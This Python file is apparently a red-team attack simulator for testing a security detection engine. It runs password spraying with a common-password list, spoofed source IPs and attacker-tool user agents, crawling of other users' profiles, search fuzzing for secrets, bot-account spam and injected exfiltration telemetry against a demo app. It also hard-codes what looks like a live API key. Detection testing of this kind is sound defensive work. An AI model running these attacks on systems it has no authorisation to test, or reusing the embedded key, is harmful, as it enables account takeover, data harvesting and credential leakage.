import os
import sys
import time
import uuid
import random
import argparse
import requests
from typing import Dict, Any, List

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# Target application URLs
DEFAULT_TARGET_APP = os.getenv("TARGET_APP_URL", "https://myapp-v1-p9qy.onrender.com")
DEFAULT_ENGINE_URL = os.getenv("TERNLINE_ENGINE_URL", "https://ternline.vercel.app")
DEFAULT_API_KEY = os.getenv("TERNLINE_API_KEY", "ce_live_10ZRFcXt_FCEEY_HPRXhgUhSE0XioNtJOof-BhaASMk")

# Attack personas & indicator addresses
KNOWN_ATTACKER_IP = "198.51.100.24"
PROXY_IPS = ["203.0.113.42", "198.51.100.89", "192.0.2.115", "198.51.100.199"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Go-http-client/1.1",
    "curl/8.4.0",
    "Hydra/9.5"
]


class AttackSimulator:
    def __init__(self, target_url: str = DEFAULT_TARGET_APP, engine_url: str = DEFAULT_ENGINE_URL, api_key: str = DEFAULT_API_KEY):
        self.target_url = target_url.rstrip("/")
        self.engine_url = engine_url.rstrip("/")
        self.api_key = api_key
        self.session = requests.Session()

    def print_step(self, title: str, desc: str):
        print(f"\n{'='*70}\n[>] {title}\n    {desc}\n{'='*70}")

    # =========================================================================
    # Attack 1: High-Speed Credential Stuffing & Distributed Password Spray
    # =========================================================================
    def run_credential_stuffing(self, username: str = "sarah_dev", attempts: int = 8):
        self.print_step(
            "ATTACK 1: Credential Stuffing & Password Spraying (T1110.001)",
            f"Spraying wrong passwords against user '{username}' to trigger Fast-Track Brute-Force & Account Lockout."
        )

        passwords = [
            "123456", "admin123", "hunter2", "letmein", "password2026",
            "dragon", "qwerty123", "football", "welcome1", "starwars"
        ]

        trace_id = f"trc_stuffing_{uuid.uuid4().hex[:10]}"
        for i in range(attempts):
            pwd = passwords[i % len(passwords)]
            headers = {
                "x-forwarded-for": KNOWN_ATTACKER_IP,
                "x-trace-id": trace_id,
                "user-agent": "Hydra/9.5"
            }
            try:
                res = self.session.post(
                    f"{self.target_url}/api/auth/login",
                    json={"username": username, "password": pwd},
                    headers=headers,
                    timeout=5
                )
                print(f"  [-] Attempt {i+1}/{attempts} with password '{pwd}': HTTP {res.status_code} ({res.text[:60]})")
            except Exception as e:
                print(f"  [!] Request error: {e}")
            time.sleep(0.15)

    # =========================================================================
    # Attack 2: Stealth Infiltration & Token Harvesting (T1550.002)
    # =========================================================================
    def run_stealth_token_harvesting(self):
        self.print_step(
            "ATTACK 2: Stealth Login & Low-Volume API Harvesting (T1550)",
            "Logging in with a legitimate credential from a suspicious external IP, then crawling all user profiles."
        )
        login_trace = f"trc_harvest_{uuid.uuid4().hex[:10]}"
        headers = {
            "x-forwarded-for": random.choice(PROXY_IPS),
            "x-trace-id": login_trace,
            "user-agent": random.choice(USER_AGENTS)
        }

        # Legitimate login
        try:
            res = self.session.post(
                f"{self.target_url}/api/auth/login",
                json={"username": "sarah_dev", "password": "password123"},
                headers=headers,
                timeout=5
            )
            token = res.json().get("access_token")
            print(f"  [+] Logged in as sarah_dev. Harvested JWT token: {token[:25]}...")
        except Exception as e:
            print(f"  [!] Login error: {e}")
            return

        auth_headers = {
            **headers,
            "Authorization": f"Bearer {token}"
        }

        # Rapid reconnaissance across creators and private profiles
        target_profiles = ["marcus_photo", "emily_style", "alex_travels", "chloe_cooks", "david_fitness"]
        for target in target_profiles:
            try:
                r = self.session.get(f"{self.target_url}/api/auth/users/{target}", headers=auth_headers, timeout=5)
                print(f"  [+] Harvested profile: @{target} (HTTP {r.status_code})")
                self.session.get(f"{self.target_url}/api/auth/users/{target}/analytics", headers=auth_headers, timeout=5)
            except Exception as e:
                print(f"  [!] Harvest error: {e}")
            time.sleep(0.1)

    # =========================================================================
    # Attack 3: Multi-Stage Cross-Service Exfiltration Chain (T1048 & T1005)
    # =========================================================================
    def run_exfiltration_chain(self):
        self.print_step(
            "ATTACK 3: Advanced Multi-Stage Exfiltration Chain (T1048 & T1005)",
            "Chaining search enumeration -> bulk post harvesting -> direct message thread scraping."
        )
        trace_id = f"trc_exfil_{uuid.uuid4().hex[:12]}"
        headers = {
            "x-forwarded-for": KNOWN_ATTACKER_IP,
            "x-trace-id": trace_id,
            "user-agent": "sqlmap/1.7.2#stable"
        }

        # Step 1: Broad search query for sensitive tokens/keywords
        queries = ["confidential", "api_key", "password", "export", "backup", "db_dump"]
        print("  [*] Step 1: Fuzzing search index for sensitive leaks...")
        for q in queries:
            try:
                r = self.session.get(f"{self.target_url}/api/search?q={q}", headers=headers, timeout=5)
                print(f"      Search query '{q}': HTTP {r.status_code}")
            except Exception as e:
                print(f"      Search query failed: {e}")
            time.sleep(0.1)

        # Step 2: Mass feed dump
        print("  [*] Step 2: Pulling all global posts & active stories...")
        try:
            r_feed = self.session.get(f"{self.target_url}/api/feed", headers=headers, timeout=5)
            r_stories = self.session.get(f"{self.target_url}/api/stories", headers=headers, timeout=5)
            print(f"      Feed extraction: HTTP {r_feed.status_code}, Stories extraction: HTTP {r_stories.status_code}")
        except Exception as e:
            print(f"      Feed extraction error: {e}")

    # =========================================================================
    # Attack 4: Social Graph Spam & Follow Bot Swarm (T1078)
    # =========================================================================
    def run_follow_bot_swarm(self, count: int = 6):
        self.print_step(
            "ATTACK 4: Bot Swarm & Rapid Follow/Unfollow Churn (T1078)",
            f"Spamming registration and follow endpoints with dynamic bot accounts."
        )
        for i in range(count):
            bot_name = f"bot_user_{uuid.uuid4().hex[:6]}"
            headers = {
                "x-forwarded-for": f"198.51.100.{random.randint(10, 240)}",
                "x-trace-id": f"trc_bot_{uuid.uuid4().hex[:8]}",
                "user-agent": "curl/8.4.0"
            }
            try:
                # Register bot
                reg = self.session.post(
                    f"{self.target_url}/api/auth/register",
                    json={"username": bot_name, "password": "BotPassword123!", "full_name": f"Bot {i}"},
                    headers=headers,
                    timeout=5
                )
                token = reg.json().get("access_token")
                if token:
                    # Rapid follow
                    auth_h = {**headers, "Authorization": f"Bearer {token}"}
                    self.session.post(f"{self.target_url}/api/social/follow/sarah_dev", headers=auth_h, timeout=5)
                    self.session.post(f"{self.target_url}/api/social/follow/marcus_photo", headers=auth_h, timeout=5)
                    print(f"  [+] Bot @{bot_name} registered and executed automated follow sequence.")
            except Exception as e:
                print(f"  [!] Bot error: {e}")
            time.sleep(0.1)

    # =========================================================================
    # Attack 5: Direct Ingestion Telemetry Attack (Simulation Fallback)
    # =========================================================================
    def run_direct_telemetry_attack(self):
        self.print_step(
            "ATTACK 5: Cross-Tenant Egress Telemetry Injection against Cyber Engine",
            "Transmitting multi-stage correlated attack telemetry directly to Ternline Engine for detection."
        )
        main_trace = f"trace-cross-service-{uuid.uuid4().hex[:8]}"
        events = [
            {
                "event_id": f"ev_{uuid.uuid4().hex[:10]}",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "app_id": "instagr-app",
                "service_id": "instagram-api",
                "event_type": "api.request",
                "severity": "medium",
                "source_resource": KNOWN_ATTACKER_IP,
                "target_resource": "POST /api/v1/internal/export",
                "trace_id": main_trace,
                "attributes": {
                    "client_ip": KNOWN_ATTACKER_IP,
                    "endpoint": "/api/v1/internal/export",
                    "status_code": 200,
                    "suspicious": True
                }
            },
            {
                "event_id": f"ev_{uuid.uuid4().hex[:10]}",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "app_id": "instagr-app",
                "service_id": "worker-service",
                "event_type": "job.processed",
                "severity": "high",
                "source_resource": "10.0.1.5",
                "target_resource": "worker:dump_all_users",
                "trace_id": main_trace,
                "attributes": {
                    "job_name": "dump_all_users",
                    "payload_size_kb": 128000,
                    "is_suspicious": True
                }
            },
            {
                "event_id": f"ev_{uuid.uuid4().hex[:10]}",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "app_id": "instagr-app",
                "service_id": "database-service",
                "event_type": "db.query",
                "severity": "critical",
                "source_resource": "10.0.1.5",
                "target_resource": "postgres:users_credentials",
                "trace_id": main_trace,
                "attributes": {
                    "table": "users_credentials",
                    "operation": "SELECT *",
                    "rows_affected": 50000,
                    "is_bulk_exfil": True
                }
            }
        ]

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }

        for ev in events:
            try:
                res = requests.post(f"{self.engine_url}/v1/events", json=ev, headers=headers, timeout=10)
                print(f"  [+] Ingested event {ev['event_type']} -> HTTP {res.status_code} ({res.text[:60]})")
            except Exception as e:
                print(f"  [!] Direct ingest error: {e}")
            time.sleep(0.2)

    def run_all(self):
        print("\n" + "#"*70)
        print(" TERNLINE AUTONOMOUS ATTACK SIMULATOR (ADVERSARY EMULATION SUITE)")
        print(f" Target App URL:   {self.target_url}")
        print(f" Cyber Engine URL: {self.engine_url}")
        print("#"*70)

        self.run_credential_stuffing()
        self.run_stealth_token_harvesting()
        self.run_exfiltration_chain()
        self.run_follow_bot_swarm()
        self.run_direct_telemetry_attack()

        print("\n" + "="*70)
        print(" [✓] ATTACK CAMPAIGN COMPLETE!")
        print(f" Open your Ternline Console at: {self.engine_url}/console")
        print(" Inspect Real-Time Detections, Incidents, and trigger Deep Search RCA.")
        print("="*70 + "\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ternline Autonomous Red Team Attack Simulator")
    parser.add_argument("--target", default=DEFAULT_TARGET_APP, help=f"Target app URL (default: {DEFAULT_TARGET_APP})")
    parser.add_argument("--engine", default=DEFAULT_ENGINE_URL, help=f"Cyber Engine URL (default: {DEFAULT_ENGINE_URL})")
    parser.add_argument("--key", default=DEFAULT_API_KEY, help="Ternline Ingestion API Key")
    parser.add_argument("--scenario", choices=["all", "brute_force", "harvesting", "exfil", "swarm", "direct"], default="all")

    args = parser.parse_args()
    sim = AttackSimulator(target_url=args.target, engine_url=args.engine, api_key=args.key)

    if args.scenario == "all":
        sim.run_all()
    elif args.scenario == "brute_force":
        sim.run_credential_stuffing()
    elif args.scenario == "harvesting":
        sim.run_stealth_token_harvesting()
    elif args.scenario == "exfil":
        sim.run_exfiltration_chain()
    elif args.scenario == "swarm":
        sim.run_follow_bot_swarm()
    elif args.scenario == "direct":
        sim.run_direct_telemetry_attack()
